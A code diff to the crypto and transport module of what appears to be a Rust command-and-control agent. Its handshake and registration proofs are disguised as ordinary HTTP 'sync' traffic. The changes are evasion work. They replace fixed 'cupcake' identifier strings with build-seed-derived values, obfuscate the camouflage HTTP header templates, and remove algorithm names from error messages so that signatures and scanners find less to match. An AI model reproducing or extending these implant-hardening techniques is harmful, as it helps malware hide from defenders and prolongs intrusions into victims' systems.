@@ -1,4 +1,4 @@
-use crate::config;
+﻿use crate::config;
 use aes_gcm::{
     aead::{Aead, KeyInit},
     Aes256Gcm, Nonce,
@@ -33,11 +33,14 @@ fn fill_aes_nonce(out: &mut [u8; NONCE_LENGTH]) -> Result<(), ()> {
 }
 
 /// Domain for agent register proof: HMAC-SHA256(session_key, REG_PROOF_DOMAIN || uuid).
-pub const REG_PROOF_DOMAIN: &[u8] = b"cupcake-reg-v1|";
+/// Build-seed derived 16-byte domain (must match server WireIDs.RegProofDomain).
+pub fn reg_proof_domain() -> &'static [u8] {
+    &crate::wire_ids::REG_PROOF_DOMAIN
+}
 
 /// HMAC-SHA256(key, domain||uuid) as base64 — proves possession of session material at register.
 pub fn register_proof(session_key: &[u8], uuid: &str) -> String {
-    let mac = hmac_sha256(session_key, &[REG_PROOF_DOMAIN, uuid.as_bytes()].concat());
+    let mac = hmac_sha256(session_key, &[reg_proof_domain(), uuid.as_bytes()].concat());
     base64::engine::general_purpose::STANDARD.encode(mac)
 }
 
@@ -46,7 +49,7 @@ pub fn verify_register_proof(session_key: &[u8], uuid: &str, proof_b64: &str) ->
     let Ok(got) = base64::engine::general_purpose::STANDARD.decode(proof_b64.trim()) else {
         return false;
     };
-    let expect = hmac_sha256(session_key, &[REG_PROOF_DOMAIN, uuid.as_bytes()].concat());
+    let expect = hmac_sha256(session_key, &[reg_proof_domain(), uuid.as_bytes()].concat());
     if got.len() != expect.len() {
         return false;
     }
@@ -58,12 +61,18 @@ pub fn verify_register_proof(session_key: &[u8], uuid: &str, proof_b64: &str) ->
 }
 
 /// Phase 2: Traffic Camouflage Constants
-const HTTP_HEADER_TEMPLATE: &[u8] =
-    b"POST /api/v1/sync HTTP/1.1\r\nContent-Type: application/json\r\nContent-Length: ";
-const HTTP_HEADER_END: &[u8] = b"\r\n\r\n";
-const HTTP_RESPONSE_TEMPLATE: &[u8] =
-    b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: ";
-const HTTP_RESPONSE_END: &[u8] = b"\r\n\r\n";
+fn http_header_template() -> Vec<u8> {
+    crate::utils::decode_obf(&crate::obf_str!("POST /sync HTTP/1.1\r\nContent-Type: application/json\r\nContent-Length: ")).into()
+}
+fn http_header_end() -> Vec<u8> {
+    crate::utils::decode_obf(&crate::obf_str!("\r\n\r\n")).into()
+}
+fn http_response_template() -> Vec<u8> {
+    crate::utils::decode_obf(&crate::obf_str!("HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: ")).into()
+}
+fn http_response_end() -> Vec<u8> {
+    crate::utils::decode_obf(&crate::obf_str!("\r\n\r\n")).into()
+}
 
 /// 使用 PBKDF2 简化版（HMAC-SHA256 × 100000 迭代）派生 32 字节 AES 密钥
 /// 虽然不如 Argon2id 内存硬度强，但在无外部 KDF 库时是最佳安全选择。
@@ -189,9 +198,9 @@ fn wrap_as_http_request(data: Vec<u8>) -> Vec<u8> {
     let mut http_packet = Vec::new();
 
     // HTTP Header
-    http_packet.extend_from_slice(HTTP_HEADER_TEMPLATE);
+    http_packet.extend_from_slice(&http_header_template());
     http_packet.extend_from_slice(content_len.to_string().as_bytes());
-    http_packet.extend_from_slice(HTTP_HEADER_END);
+    http_packet.extend_from_slice(&http_header_end());
 
     // Content: Base64(Data) + Padding JSON
     http_packet.extend_from_slice(b64_data.as_bytes());
@@ -469,7 +478,7 @@ pub fn encrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
     // predictable nonces break AES-GCM confidentiality under reuse.
     let mut nonce_bytes = [0u8; NONCE_LENGTH];
     if fill_aes_nonce(&mut nonce_bytes).is_err() {
-        error!("AES-GCM nonce: secure random unavailable (fail-closed)");
+        error!("nonce: secure random unavailable (fail-closed)");
         return Vec::new();
     }
     let nonce = Nonce::from_slice(&nonce_bytes);
@@ -523,7 +532,7 @@ pub fn decrypt(data: &[u8], key: &[u8]) -> Result<Vec<u8>, String> {
 
     // 验证密钥长度
     if key.len() != 32 {
-        let err = format!("AES-256 requires a 32-byte key, got {} bytes", key.len());
+        let err = format!("encryption requires a 32-byte key, got {} bytes", key.len());
         error!("{}", err);
         return Err(err);
     }
@@ -877,8 +886,13 @@ mod tests {
 pub const NOISE_VERSION: u8 = 0x02;
 pub const NOISE_MAC_LEN: usize = 16;
 pub const NOISE_MSG_LEN: usize = 1 + 32 + NOISE_MAC_LEN; // 49
-const NOISE_INIT_DOM: &[u8] = b"cupcake-noise-init-v2|";
-const NOISE_RESP_DOM: &[u8] = b"cupcake-noise-resp-v2|";
+// Seed-derived MAC domains (must match server WireIDs.NoiseInitDom / NoiseRespDom).
+fn noise_init_dom() -> &'static [u8] {
+    &crate::wire_ids::NOISE_INIT_DOM
+}
+fn noise_resp_dom() -> &'static [u8] {
+    &crate::wire_ids::NOISE_RESP_DOM
+}
 
 /// Ephemeral X25519 key pair for one handshake session.
 #[derive(Clone)]
@@ -1153,7 +1167,7 @@ pub fn noise_initiate(psk: &[u8]) -> Result<(EphemeralKey, Vec<u8>), String> {
         return Err("noise psk required".into());
     }
     let e = EphemeralKey::generate()?;
-    let mac = noise_psk_mac(psk, NOISE_INIT_DOM, &[&e.public]);
+    let mac = noise_psk_mac(psk, noise_init_dom(), &[&e.public]);
     let mut msg = Vec::with_capacity(NOISE_MSG_LEN);
     msg.push(NOISE_VERSION);
     msg.extend_from_slice(&e.public);
@@ -1182,14 +1196,14 @@ pub fn noise_respond(
     let mut client_public = [0u8; 32];
     client_public.copy_from_slice(&client_msg[1..33]);
     let client_mac = &client_msg[33..49];
-    let expect_mac = noise_psk_mac(psk, NOISE_INIT_DOM, &[&client_public]);
+    let expect_mac = noise_psk_mac(psk, noise_init_dom(), &[&client_public]);
     if !noise_mac_ok(client_mac, &expect_mac) {
         return Err("noise psk auth failed (client mac)".into());
     }
 
     let e = EphemeralKey::generate()?;
     let session_key = derive_session_key(&e.secret, &client_public, psk);
-    let resp_mac = noise_psk_mac(psk, NOISE_RESP_DOM, &[&client_public, &e.public]);
+    let resp_mac = noise_psk_mac(psk, noise_resp_dom(), &[&client_public, &e.public]);
 
     let mut response = Vec::with_capacity(NOISE_MSG_LEN);
     response.push(NOISE_VERSION);
@@ -1223,7 +1237,7 @@ pub fn noise_complete(
     let mut server_public = [0u8; 32];
     server_public.copy_from_slice(&server_response[1..33]);
     let server_mac = &server_response[33..49];
-    let expect = noise_psk_mac(psk, NOISE_RESP_DOM, &[&local_e.public, &server_public]);
+    let expect = noise_psk_mac(psk, noise_resp_dom(), &[&local_e.public, &server_public]);
     if !noise_mac_ok(server_mac, &expect) {
         return Err("noise psk auth failed (server mac)".into());
     }
